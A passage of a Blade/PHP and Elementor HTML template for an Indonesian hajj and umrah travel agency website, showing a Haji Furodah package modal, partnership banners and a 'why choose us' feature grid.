<div class="elementor-element elementor-element-5a13e25 elementor-view-default elementor-widget elementor-widget-icon" data-id="5a13e25" data-element_type="widget" data-widget_type="icon.default"><div class="elementor-widget-container"><div class="elementor-icon-wrapper"><div class="elementor-icon">
<i aria-hidden="true" class="fas fa-hotel"></i>
</div></div></div></div>
<div class="elementor-element elementor-element-6e7ccba elementor-widget elementor-widget-heading" data-id="6e7ccba" data-element_type="widget" data-widget_type="heading.default"><div class="elementor-widget-container"><h2 class="elementor-heading-title elementor-size-default">Hotel</h2></div></div>
<div class="elementor-element elementor-element-f0860b8 elementor-view-default elementor-widget elementor-widget-icon" data-id="f0860b8" data-element_type="widget" data-widget_type="icon.default"><div class="elementor-widget-container"><div class="elementor-icon-wrapper"><div class="elementor-icon">
<i aria-hidden="true" class="fas fa-star"></i>
</div></div></div></div>
<div class="elementor-element elementor-element-55d3699 elementor-widget elementor-widget-heading" data-id="55d3699" data-element_type="widget" data-widget_type="heading.default"><div class="elementor-widget-container"><h2 class="elementor-heading-title elementor-size-default">4+</h2></div></div>
</div></div>

{{-- modal --}}
<div class="modal fade" id="modalFurodah" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true" style="margin-top:260px; padding-top:260px;
z-index:99;">
    <div class="modal-dialog">
      <div class="modal-content">
        <div class="modal-header">
          <h1 class="modal-title fs-5" id="exampleModalLabel">Haji Furodah</h1>
          <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
        </div>
        <div class="modal-body">
            <img src="{{ asset($get_hajiFurodah['path_gambar_pamflet'])}}">
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
        </div>
      </div>
    </div>
  </div>
  <script>
    function hapusBackdrop5() {
        const backdrop = document.querySelector('.modal-backdrop');
        if (backdrop) {
            backdrop.parentNode.removeChild(backdrop); // Menghapus elemen modal-backdrop
        }
    }
</script>
{{-- akhir modal --}}

<div class="elementor-element elementor-element-3762ab2 elementor-widget elementor-widget-text-editor" data-id="3762ab2" data-element_type="widget" data-widget_type="text-editor.default"><div class="elementor-widget-container">
    <?php $hotels = explode(";",$get_hajiFurodah['list_hotel']);
    $i = 1;
    foreach ($hotels as $key) {
        if($i>1){
            echo '<p style="margin-top:-3vh">'.$key.'</p>';
        }else {
            echo '<p>'.$key.'</p>';
        }
        $i++;
    }
    ?>
</div></div>
</div></div>
<div class="elementor-element elementor-element-17bc78b e-flex e-con-boxed e-con" data-id="17bc78b" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-element elementor-element-ad36d58 e-flex e-con-boxed e-con" data-id="ad36d58" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-element elementor-element-f3f9529 elementor-view-default elementor-widget elementor-widget-icon" data-id="f3f9529" data-element_type="widget" data-widget_type="icon.default"><div class="elementor-widget-container"><div class="elementor-icon-wrapper"><div class="elementor-icon">
<i aria-hidden="true" class="fas fa-plane"></i>
</div></div></div></div>
<div class="elementor-element elementor-element-c3b1cb3 elementor-widget elementor-widget-heading" data-id="c3b1cb3" data-element_type="widget" data-widget_type="heading.default"><div class="elementor-widget-container"><h2 class="elementor-heading-title elementor-size-default">
    <?php

    if(strpos($get_hajiFurodah['maskapai'],";")==null){
echo $get_hajiFurodah['maskapai'];
}else{

$maskapai = explode(";",$get_hajiFurodah['maskapai']);
    echo '<p>';
    $c = 1;
    $total_maskapai = count($maskapai);
    foreach ($maskapai as $key) {
        if($c == $total_maskapai){
           echo $key;
        }else{
           echo  $key.'</br>';
        }
        $c++;
    }
    echo '</p>';

}
    ?>

</h2></div></div>
</div></div>
<div class="elementor-element elementor-element-1148d64 elementor-widget elementor-widget-text-editor" data-id="1148d64" data-element_type="widget" data-widget_type="text-editor.default"><div class="elementor-widget-container"><p>Etihad Airways</p></div></div>
</div></div>
</div></div>
<div class="elementor-element elementor-element-f296fc2 elementor-align-center elementor-widget elementor-widget-button" data-id="f296fc2" data-element_type="widget" data-widget_type="button.default"><div class="elementor-widget-container"><div class="elementor-button-wrapper">
<a class="elementor-button elementor-button-link elementor-size-sm elementor-animation-grow" href="#" data-bs-toggle="modal" data-bs-target="#modalFurodah" onclick="hapusBackdrop5()">
<span class="elementor-button-content-wrapper">
<span class="elementor-button-text">Detail Paket</span>
</span>
</a>
</div></div></div>
</div></div>
</div></div>
</div></div></div></section><div class="elementor-element elementor-element-3b2c5e1 e-flex e-con-boxed e-con" data-id="3b2c5e1" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;,&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-element elementor-element-896453f elementor-widget elementor-widget-heading" data-id="896453f" data-element_type="widget" data-widget_type="heading.default"><div class="elementor-widget-container"><h2 class="elementor-heading-title elementor-size-default">Program Lainnya</h2></div></div>
<div class="elementor-element elementor-element-9ee2e4e elementor-widget elementor-widget-sina_banner_slider" data-id="9ee2e4e" data-element_type="widget" data-widget_type="sina_banner_slider.default"><div class="elementor-widget-container"><div class="sina-banner-slider owl-carousel" data-autoplay="" data-pause="yes" data-nav="yes" data-dots="yes" data-mouse-drag="yes" data-touch-drag="yes" data-loop="yes" data-speed="" data-part-anim="yes" data-delay="5000">
<div class="sina-slider-content sina-bg-cover" style="background-image: url({{ asset('/wp-content/uploads/2023/10/Background-krem.jpg') }});"><div class="sina-banner-container elementor-repeater-item-62d22df">
<h1 class="sina-banner-title sina-anim-invisible" data-animation="animated fadeInLeft"> Kolaborasi<span>  Full Paket</span>
</h1>
<div class="sina-banner-desc sina-anim-invisible" data-animation="animated fadeInUp">Kami menyediakan paket perjalanan ibadah
umrah dan haji dengan pengalaman tak
terlupakan dan harga terbaik.</div>
<div class="sina-banner-btns sina-anim-invisible" data-animation="animated fadeInUp">
    <button type="button" class="sina-banner-sbtn" data-bs-toggle="modal" data-bs-target="#exampleModal" onclick="hapusBackdrop()">
        Selengkapnya
      </button>
      <div class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true" style="margin-top:40vh; z-index:99">
        <div class="modal-dialog">
          <div class="modal-content">
            <div class="modal-header">
              <h1 class="modal-title fs-5" id="exampleModalLabel">Kolaborasi Full Paket</h1>
              <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div class="modal-body">
                Kami menyediakan hotel yang dekat dengan  masjid agar anda lebih nyaman dalam menjalankan ibadah
            </div>
            <div class="modal-footer">
              <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
            </div>
          </div>
        </div>
      </div>

      <script>
        function hapusBackdrop() {
            const backdrop = document.querySelector('.modal-backdrop');
            if (backdrop) {
                backdrop.parentNode.removeChild(backdrop); // Menghapus elemen modal-backdrop
            }
        }
    </script>

<a class="sina-banner-sbtn   " href="#hubungi">
Hubungi											</a>
</div>
</div></div>
<!-- Modal -->
<!-- Modal -->

<div class="sina-slider-content sina-bg-cover" style="background-image: url({{ asset('/wp-content/uploads/2023/10/Background-krem.jpg') }});"><div class="sina-banner-container elementor-repeater-item-bca57ce">
<h1 class="sina-banner-title sina-anim-invisible" data-animation="animated fadeInLeft">Kolaborasi<span>  Land Arrangement</span>
</h1>
<div class="sina-banner-desc sina-anim-invisible" data-animation="animated fadeInUp">Kami siap menjadi representatif bagi siapa saja yang
sedang mencari fasilitator terbaik untuk
memberikan pengalaman terbaik kepada
jamaahnya ketika berada di Saudi Arabia.</div>
<div class="sina-banner-btns sina-anim-invisible" data-animation="animated fadeInUp">
<a class="sina-banner-pbtn   " href="#">
Selengkapnya											</a>
<a class="sina-banner-sbtn   " href="#">
Hubungi											</a>
</div>
</div></div>


<div class="sina-slider-content sina-bg-cover" style="background-image: url({{ asset('/wp-content/uploads/2023/10/Background-krem.jpg') }});"><div class="sina-banner-container elementor-repeater-item-68e6936">
<h1 class="sina-banner-title sina-anim-invisible" data-animation="animated fadeInLeft">Kolaborasi<span> Pengembangan Perusahaan</span>
</h1>
<div class="sina-banner-desc sina-anim-invisible" data-animation="animated fadeInUp">Kami siap menjadi partner bagi siapa saja yang
fokus pada pengembangan / inovasi layanan
ibadah umrah dan haji lainnya.</div>
<div class="sina-banner-btns sina-anim-invisible" data-animation="animated fadeInUp">
<a class="sina-banner-pbtn   " href="#">
Selengkapnya											</a>
<a class="sina-banner-sbtn   " href="#">
Hubungi											</a>
</div>
</div></div>
</div></div></div>
</div></div>
<section  class="elementor-section elementor-top-section elementor-element elementor-element-483929ab elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="483929ab" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}"><div class="elementor-background-overlay"></div>
<div class="elementor-container elementor-column-gap-default"><div id="kenapa_fokus" class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-f1c4e5b" data-id="f1c4e5b" data-element_type="column"><div class="elementor-widget-wrap elementor-element-populated"><div class="elementor-element elementor-element-4506cd6 e-flex e-con-boxed e-con" data-id="4506cd6" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner"><div class="elementor-element elementor-element-32b0a89 elementor-widget elementor-widget-heading" data-id="32b0a89" data-element_type="widget" data-widget_type="heading.default"><div class="elementor-widget-container"><h2 class="elementor-heading-title elementor-size-default"><span style="background: linear-gradient(90deg, #6B5E56 20%, #8B7E74 50%); -webkit-background-clip: text;  -webkit-text-fill-color: transparent;"> Kenapa memilih kami</span></h2></div></div></div></div></div></div></div></section><section class="elementor-section elementor-top-section elementor-element elementor-element-5719fe7 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="5719fe7" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}"><div class="elementor-background-overlay"></div>
<div class="elementor-container elementor-column-gap-default">
<div class="elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-15fb4b12 elementor-invisible" data-id="15fb4b12" data-element_type="column" data-settings="{&quot;animation&quot;:&quot;zoomIn&quot;,&quot;animation_delay&quot;:300}"><div class="elementor-widget-wrap elementor-element-populated"><div class="elementor-element elementor-element-35a76d8e elementor-flip-box--3d elementor-flip-box--effect-flip elementor-flip-box--direction-up elementor-widget elementor-widget-flip-box" data-id="35a76d8e" data-element_type="widget" data-widget_type="flip-box.default"><div class="elementor-widget-container"><div class="elementor-flip-box" tabindex="0">
<div class="elementor-flip-box__layer elementor-flip-box__front"><div class="elementor-flip-box__layer__overlay"><div class="elementor-flip-box__layer__inner">
<div class="elementor-icon-wrapper elementor-view-default"><div class="elementor-icon">
<svg xmlns="http://www.w3.org/2000/svg" height="48" viewbox="0 -960 960 960" width="48"><path d="m336-28-82-140-163-34 19-158L7-480l103-119-19-159 163-33 82-141 144 66 145-66 82 141 162 33-19 159 103 119-103 120 19 158-162 34-82 140-145-66-144 66Zm101-311 235-233-54-49-181 180-94-100-55 54 149 148Z"></path></svg>
</div></div>
<h3 class="elementor-flip-box__layer__title">
Komitmen</h3>
</div></div></div>
<div class="elementor-flip-box__layer elementor-flip-box__back"><div class="elementor-flip-box__layer__overlay"><div class="elementor-flip-box__layer__inner"><div class="elementor-flip-box__layer__description">
Menjadi penyelenggara perjalanan ibadah umrah dan haji terdepan dengan mengutamakan kenyamanan serta kepuasan jamaah</div></div></div></div>
</div></div></div></div></div>
<div class="elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-357fc195 elementor-invisible" data-id="357fc195" data-element_type="column" data-settings="{&quot;animation&quot;:&quot;zoomIn&quot;,&quot;animation_delay&quot;:300}"><div class="elementor-widget-wrap elementor-element-populated"><div class="elementor-element elementor-element-651df086 elementor-flip-box--3d elementor-flip-box--effect-flip elementor-flip-box--direction-up elementor-widget elementor-widget-flip-box" data-id="651df086" data-element_type="widget" data-widget_type="flip-box.default"><div class="elementor-widget-container"><div class="elementor-flip-box" tabindex="0">
<div class="elementor-flip-box__layer elementor-flip-box__front"><div class="elementor-flip-box__layer__overlay"><div class="elementor-flip-box__layer__inner">
<div class="elementor-icon-wrapper elementor-view-default"><div class="elementor-icon">
<i class="fas fa-user-check"></i>
</div></div>
<h3  class="elementor-flip-box__layer__title">
Tim Lengkap</h3>
</div></div></div>
<div class="elementor-flip-box__layer elementor-flip-box__back"><div class="elementor-flip-box__layer__overlay"><div class="elementor-flip-box__layer__inner"><div class="elementor-flip-box__layer__description">
Memiliki tim di setiap area
kerja Indonesia dan Saudi
Arabia</div></div></div></div>
</div></div></div></div></div>
<div class="elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-3db7fd12 elementor-invisible" data-id="3db7fd12" data-element_type="column" data-settings="{&quot;animation&quot;:&quot;zoomIn&quot;,&quot;animation_delay&quot;:300}"><div class="elementor-widget-wrap elementor-element-populated"><div class="elementor-element elementor-element-45683607 elementor-flip-box--3d elementor-flip-box--effect-flip elementor-flip-box--direction-up elementor-widget elementor-widget-flip-box" data-id="45683607" data-element_type="widget" data-widget_type="flip-box.default"><div class="elementor-widget-container"><div class="elementor-flip-box" tabindex="0">
<div class="elementor-flip-box__layer elementor-flip-box__front"><div class="elementor-flip-box__layer__overlay"><div class="elementor-flip-box__layer__inner">
<div class="elementor-icon-wrapper elementor-view-default"><div class="elementor-icon">
<i class="fas fa-suitcase-rolling"></i>
</div></div>
<h3 class="elementor-flip-box__layer__title">
Fasilitas Lengkap</h3>
</div></div></div>
<div class="elementor-flip-box__layer elementor-flip-box__back"><div class="elementor-flip-box__layer__overlay"><div class="elementor-flip-box__layer__inner"><div class="elementor-flip-box__layer__description">
Perlengkapan ekslusif, bus eksekutif, kendaraan pribadi, kereta cepat, hotel berbintang, audio transmitter, fullboard restaurant, welcome foods & drinks, zam-zam,  dokumentasi, dan asuransi perjalanan</div></div></div></div>
</div></div></div></div></div>
<div class="elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-237c1b8c elementor-invisible" data-id="237c1b8c" data-element_type="column" data-settings="{&quot;animation&quot;:&quot;zoomIn&quot;,&quot;animation_delay&quot;:300}"><div class="elementor-widget-wrap elementor-element-populated"><div class="elementor-element elementor-element-7ed2b3f6 elementor-flip-box--3d elementor-flip-box--effect-flip elementor-flip-box--direction-up elementor-widget elementor-widget-flip-box" data-id="7ed2b3f6" data-element_type="widget" data-widget_type="flip-box.default"><div class="elementor-widget-container"><div class="elementor-flip-box" tabindex="0">
<div class="elementor-flip-box__layer elementor-flip-box__front"><div class="elementor-flip-box__layer__overlay"><div class="elementor-flip-box__layer__inner">
<div class="elementor-icon-wrapper elementor-view-default"><div class="elementor-icon">
<i class="far fa-grin-beam"></i>
</div></div>
<h3 class="elementor-flip-box__layer__title">
Professional</h3>
</div></div></div>
<div class="elementor-flip-box__layer elementor-flip-box__back"><div class="elementor-flip-box__layer__overlay"><div class="elementor-flip-box__layer__inner"><div class="elementor-flip-box__layer__description">
Tim kami didominasi oleh kalangan anak muda yang fasih berbahasa Arab, Inggris, dan Indonesia serta aktif, komunikatif, dan fast response</div></div></div></div>
</div></div></div></div></div>
</div></section><section class="elementor-section elementor-top-section elementor-element elementor-element-7c837b8 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="7c837b8" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}"><div class="elementor-background-overlay"></div>
<div class="elementor-container elementor-column-gap-default">
<div class="elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-1d6e7dd elementor-invisible" data-id="1d6e7dd" data-element_type="column" data-settings="{&quot;animation&quot;:&quot;zoomIn&quot;,&quot;animation_delay&quot;:300}"><div class="elementor-widget-wrap elementor-element-populated"><div class="elementor-element elementor-element-3a4024b elementor-flip-box--3d elementor-flip-box--effect-flip elementor-flip-box--direction-up elementor-widget elementor-widget-flip-box" data-id="3a4024b" data-element_type="widget" data-widget_type="flip-box.default"><div class="elementor-widget-container"><div class="elementor-flip-box" tabindex="0">
<div class="elementor-flip-box__layer elementor-flip-box__front"><div class="elementor-flip-box__layer__overlay"><div class="elementor-flip-box__layer__inner">
<div class="elementor-icon-wrapper elementor-view-default"><div class="elementor-icon">
<i class="fas fa-store-alt"></i>
</div></div>
<h3 class="elementor-flip-box__layer__title">
Kantor</h3>
</div></div></div>
<div class="elementor-flip-box__layer elementor-flip-box__back"><div class="elementor-flip-box__layer__overlay"><div class="elementor-flip-box__layer__inner"><div class="elementor-flip-box__layer__description">
Memiliki kantor di Indonesia dan Saudi Arabia
guna memperlancar proses kerja</div></div></div></div>
</div></div></div></div></div>
<div class="elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-db138ff elementor-invisible" data-id="db138ff" data-element_type="column" data-settings="{&quot;animation&quot;:&quot;zoomIn&quot;,&quot;animation_delay&quot;:300}"><div class="elementor-widget-wrap elementor-element-populated"><div class="elementor-element elementor-element-7a01893 elementor-flip-box--3d elementor-flip-box--effect-flip elementor-flip-box--direction-up elementor-widget elementor-widget-flip-box" data-id="7a01893" data-element_type="widget" data-widget_type="flip-box.default"><div class="elementor-widget-container"><div class="elementor-flip-box" tabindex="0">
<div class="elementor-flip-box__layer elementor-flip-box__front"><div class="elementor-flip-box__layer__overlay"><div class="elementor-flip-box__layer__inner">
<div class="elementor-icon-wrapper elementor-view-default"><div class="elementor-icon">
<i class="far fa-clock"></i>
</div></div>
<h3 class="elementor-flip-box__layer__title">
Respon Cepat</h3>
</div></div></div>
<div class="elementor-flip-box__layer elementor-flip-box__back"><div class="elementor-flip-box__layer__overlay"><div class="elementor-flip-box__layer__inner"><div class="elementor-flip-box__layer__description">
Aktif 24 jam dalam melayani jamaah baik di group koordinasi (Whatsapp) maupun
di lapangan (Saudi Arabia) yang disupport oleh tim handling</div></div></div></div>
</div></div></div></div></div>
<div class="elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-c0c466c elementor-invisible" data-id="c0c466c" data-element_type="column" data-settings="{&quot;animation&quot;:&quot;zoomIn&quot;,&quot;animation_delay&quot;:300}"><div class="elementor-widget-wrap elementor-element-populated"><div class="elementor-element elementor-element-4724f5f elementor-flip-box--3d elementor-flip-box--effect-flip elementor-flip-box--direction-up elementor-widget elementor-widget-flip-box" data-id="4724f5f" data-element_type="widget" data-widget_type="flip-box.default"><div class="elementor-widget-container"><div class="elementor-flip-box" tabindex="0">
<div class="elementor-flip-box__layer elementor-flip-box__front"><div class="elementor-flip-box__layer__overlay"><div class="elementor-flip-box__layer__inner">
<div class="elementor-icon-wrapper elementor-view-default"><div class="elementor-icon">
<i class="fas fa-street-view"></i>
</div></div>
<h3 class="elementor-flip-box__layer__title">
Penanganan VIP</h3>
</div></div></div>
<div class="elementor-flip-box__layer elementor-flip-box__back"><div class="elementor-flip-box__layer__overlay"><div class="elementor-flip-box__layer__inner"><div class="elementor-flip-box__layer__description">
Terbukti berhasil menghandle beberapa tokoh ternama, public figure, maupun  pejabat tinggi</div></div></div></div>
</div></div></div></div></div>
<div class="elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-6e31cfd elementor-invisible" data-id="6e31cfd" data-element_type="column" data-settings="{&quot;animation&quot;:&quot;zoomIn&quot;,&quot;animation_delay&quot;:300}"><div class="elementor-widget-wrap elementor-element-populated"><div class="elementor-element elementor-element-8cc6e14 elementor-flip-box--3d elementor-flip-box--effect-flip elementor-flip-box--direction-up elementor-widget elementor-widget-flip-box" data-id="8cc6e14" data-element_type="widget" data-widget_type="flip-box.default"><div class="elementor-widget-container"><div class="elementor-flip-box" tabindex="0">
<div class="elementor-flip-box__layer elementor-flip-box__front"><div class="elementor-flip-box__layer__overlay"><div class="elementor-flip-box__layer__inner">
<div class="elementor-icon-wrapper elementor-view-default"><div class="elementor-icon">
<i class="fas fa-user-plus"></i>
</div></div>
<h3 class="elementor-flip-box__layer__title">
Berpengalaman</h3>
</div></div></div>
<div class="elementor-flip-box__layer elementor-flip-box__back"><div class="elementor-flip-box__layer__overlay"><div class="elementor-flip-box__layer__inner"><div class="elementor-flip-box__layer__description">
Memiliki tim handling  Saudi Arabia yang sudah berpengalaman mengelola jamaah dari berbagai travel di Indonesia</div></div></div></div>
</div></div></div></div></div>
</div></section><section class="elementor-section elementor-top-section elementor-element elementor-element-de724cd elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="de724cd" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}"><div class="elementor-background-overlay"></div>
<div class="elementor-container elementor-column-gap-default">
<div class="elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-1fbdd3b elementor-invisible" data-id="1fbdd3b" data-element_type="column" data-settings="{&quot;animation&quot;:&quot;zoomIn&quot;,&quot;animation_delay&quot;:300}"><div class="elementor-widget-wrap elementor-element-populated"><div class="elementor-element elementor-element-2ad68dd elementor-flip-box--3d elementor-flip-box--effect-flip elementor-flip-box--direction-up elementor-widget elementor-widget-flip-box" data-id="2ad68dd" data-element_type="widget" data-widget_type="flip-box.default"><div class="elementor-widget-container"><div class="elementor-flip-box" tabindex="0">
<div class="elementor-flip-box__layer elementor-flip-box__front"><div class="elementor-flip-box__layer__overlay"><div class="elementor-flip-box__layer__inner">
<div class="elementor-icon-wrapper elementor-view-default"><div class="elementor-icon">
<i class="fas fa-hotel"></i>
</div></div>
<h3 class="elementor-flip-box__layer__title">
Hotel Dekat</h3>
</div></div></div>
<div class="elementor-flip-box__layer elementor-flip-box__back"><div class="elementor-flip-box__layer__overlay"><div class="elementor-flip-box__layer__inner"><div class="elementor-flip-box__layer__description">
Kami menyediakan hotel yang dekat dengan  masjid agar anda lebih nyaman dalam menjalankan ibadah</div></div></div></div>
</div></div></div></div></div>
<div class="elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-ff5acf9 elementor-invisible" data-id="ff5acf9" data-element_type="column" data-settings="{&quot;animation&quot;:&quot;zoomIn&quot;,&quot;animation_delay&quot;:300}"><div class="elementor-widget-wrap elementor-element-populated"><div class="elementor-element elementor-element-894226b elementor-flip-box--3d elementor-flip-box--effect-flip elementor-flip-box--direction-up elementor-widget elementor-widget-flip-box" data-id="894226b" data-element_type="widget" data-widget_type="flip-box.default"><div class="elementor-widget-container"><div class="elementor-flip-box" tabindex="0">
<div class="elementor-flip-box__layer elementor-flip-box__front"><div class="elementor-flip-box__layer__overlay"><div class="elementor-flip-box__layer__inner">
<div class="elementor-icon-wrapper elementor-view-default"><div class="elementor-icon">
<i class="fas fa-plane-arrival"></i>
</div></div>
<h3 class="elementor-flip-box__layer__title">
Penyambutan</h3>
</div></div></div>
<div class="elementor-flip-box__layer elementor-flip-box__back"><div class="elementor-flip-box__layer__overlay"><div class="elementor-flip-box__layer__inner"><div class="elementor-flip-box__layer__description">
Tim kami menyiapkan
fasilitas penyambutan
kedatangan jamaah</div></div></div></div>
</div></div></div></div></div>
<div class="elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-c06c136 elementor-invisible" data-id="c06c136" data-element_type="column" data-settings="{&quot;animation&quot;:&quot;zoomIn&quot;,&quot;animation_delay&quot;:300}"><div class="elementor-widget-wrap elementor-element-populated"><div class="elementor-element elementor-element-3c87c0e elementor-flip-box--3d elementor-flip-box--effect-flip elementor-flip-box--direction-up elementor-widget elementor-widget-flip-box" data-id="3c87c0e" data-element_type="widget" data-widget_type="flip-box.default"><div class="elementor-widget-container"><div class="elementor-flip-box" tabindex="0">
<div class="elementor-flip-box__layer elementor-flip-box__front"><div class="elementor-flip-box__layer__overlay"><div class="elementor-flip-box__layer__inner">
<div class="elementor-icon-wrapper elementor-view-default"><div class="elementor-icon">
<i class="far fa-check-square"></i>
</div></div>
<h3 class="elementor-flip-box__layer__title">
Detail</h3>
</div></div></div>
<div class="elementor-flip-box__layer elementor-flip-box__back"><div class="elementor-flip-box__layer__overlay"><div class="elementor-flip-box__layer__inner"><div class="elementor-flip-box__layer__description">
Memiliki SOP dan detail handling schedule</div></div></div></div>
</div></div></div></div></div>
<div class="elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-de50ba4 elementor-invisible" data-id="de50ba4" data-element_type="column" data-settings="{&quot;animation&quot;:&quot;zoomIn&quot;,&quot;animation_delay&quot;:300}"><div class="elementor-widget-wrap elementor-element-populated"><div class="elementor-element elementor-element-e996661 elementor-flip-box--3d elementor-flip-box--effect-flip elementor-flip-box--direction-up elementor-widget elementor-widget-flip-box" data-id="e996661" data-element_type="widget" data-widget_type="flip-box.default"><div class="elementor-widget-container"><div class="elementor-flip-box" tabindex="0">
<div class="elementor-flip-box__layer elementor-flip-box__front"><div class="elementor-flip-box__layer__overlay"><div class="elementor-flip-box__layer__inner">
<div class="elementor-icon-wrapper elementor-view-default"><div class="elementor-icon">
<i class="fas fa-gift"></i>
</div></div>
<h3 class="elementor-flip-box__layer__title">
Promo Menarik</h3>
</div></div></div>
<div class="elementor-flip-box__layer elementor-flip-box__back"><div class="elementor-flip-box__layer__overlay"><div class="elementor-flip-box__layer__inner"><div class="elementor-flip-box__layer__description">
Banyak promo menarik yang bisa didapatkan</div></div></div></div>
</div></div></div></div></div>
</div></section><section class="elementor-section elementor-top-section elementor-element elementor-element-c3eac25 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="c3eac25" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}"><div class="elementor-background-overlay"></div>
<div class="elementor-container elementor-column-gap-default">
<div class="elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-a9c2126 elementor-invisible" data-id="a9c2126" data-element_type="column" data-settings="{&quot;animation&quot;:&quot;zoomIn&quot;,&quot;animation_delay&quot;:300}"><div class="elementor-widget-wrap elementor-element-populated"><div class="elementor-element elementor-element-5fafaa6 elementor-flip-box--3d elementor-flip-box--effect-flip elementor-flip-box--direction-up elementor-widget elementor-widget-flip-box" data-id="5fafaa6" data-element_type="widget" data-widget_type="flip-box.default"><div class="elementor-widget-container"><div class="elementor-flip-box" tabindex="0">
<div class="elementor-flip-box__layer elementor-flip-box__front"><div class="elementor-flip-box__layer__overlay"><div class="elementor-flip-box__layer__inner">
<div class="elementor-icon-wrapper elementor-view-default"><div class="elementor-icon">
<i class="fas fa-luggage-cart"></i>
</div></div>
<h3 class="elementor-flip-box__layer__title">
Penanganan Bagasi</h3>
</div></div></div>
<div class="elementor-flip-box__layer elementor-flip-box__back"><div class="elementor-flip-box__layer__overlay"><div class="elementor-flip-box__layer__inner"><div class="elementor-flip-box__layer__description">
Tim kami akan langsung
menghandle bagasi jamaah
saat tiba di bandara sampai
ke depan kamar hotel
dengan teknologi scan
barcode</div></div></div></div>
</div></div></div></div></div>
<div class="elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-42794b6 elementor-invisible" data-id="42794b6" data-element_type="column" data-settings="{&quot;animation&quot;:&quot;zoomIn&quot;,&quot;animation_delay&quot;:300}"><div class="elementor-widget-wrap elementor-element-populated"><div class="elementor-element elementor-element-da0aff8 elementor-flip-box--3d elementor-flip-box--effect-flip elementor-flip-box--direction-up elementor-widget elementor-widget-flip-box" data-id="da0aff8" data-element_type="widget" data-widget_type="flip-box.default"><div class="elementor-widget-container"><div class="elementor-flip-box" tabindex="0">
<div class="elementor-flip-box__layer elementor-flip-box__front"><div class="elementor-flip-box__layer__overlay"><div class="elementor-flip-box__layer__inner">
<div class="elementor-icon-wrapper elementor-view-default"><div class="elementor-icon">
<i class="fas fa-people-carry"></i>
</div></div>
<h3 class="elementor-flip-box__layer__title">
Tim Gerak Cepat</h3>
</div></div></div>
<div class="elementor-flip-box__layer elementor-flip-box__back"><div class="elementor-flip-box__layer__overlay"><div class="elementor-flip-box__layer__inner"><div class="elementor-flip-box__layer__description">
Memiliki tim gerak cepat / TGC di Saudi Arabia guna mengantisipasi kebutuhan darurat</div></div></div></div>
</div></div></div></div></div>
<div class="elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-11bc451 elementor-invisible" data-id="11bc451" data-element_type="column" data-settings="{&quot;animation&quot;:&quot;zoomIn&quot;,&quot;animation_delay&quot;:300}"><div class="elementor-widget-wrap elementor-element-populated"><div class="elementor-element elementor-element-99e2eaa elementor-flip-box--3d elementor-flip-box--effect-flip elementor-flip-box--direction-up elementor-widget elementor-widget-flip-box" data-id="99e2eaa" data-element_type="widget" data-widget_type="flip-box.default"><div class="elementor-widget-container"><div class="elementor-flip-box" tabindex="0">
<div class="elementor-flip-box__layer elementor-flip-box__front"><div class="elementor-flip-box__layer__overlay"><div class="elementor-flip-box__layer__inner">
<div class="elementor-icon-wrapper elementor-view-default"><div class="elementor-icon">
<i class="fas fa-plane-departure"></i>
</div></div>
<h3 class="elementor-flip-box__layer__title">
Penerbangan Langsung</h3>
</div></div></div>
<div class="elementor-flip-box__layer elementor-flip-box__back"><div class="elementor-flip-box__layer__overlay"><div class="elementor-flip-box__layer__inner"><div class="elementor-flip-box__layer__description">
Kami menggunakan maskapai dengan penerbangan tanpa transit</div></div></div></div>
</div></div></div></div></div>
<div class="elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-3438517 elementor-invisible" data-id="3438517" data-element_type="column" data-settings="{&quot;animation&quot;:&quot;zoomIn&quot;,&quot;animation_delay&quot;:300}"><div class="elementor-widget-wrap elementor-element-populated"><div class="elementor-element elementor-element-3756273 elementor-flip-box--3d elementor-flip-box--effect-flip elementor-flip-box--direction-up elementor-widget elementor-widget-flip-box" data-id="3756273" data-element_type="widget" data-widget_type="flip-box.default"><div class="elementor-widget-container"><div class="elementor-flip-box" tabindex="0">
<div class="elementor-flip-box__layer elementor-flip-box__front"><div class="elementor-flip-box__layer__overlay"><div class="elementor-flip-box__layer__inner">
<div class="elementor-icon-wrapper elementor-view-default"><div class="elementor-icon">
<i class="fas fa-user-plus"></i>
</div></div>
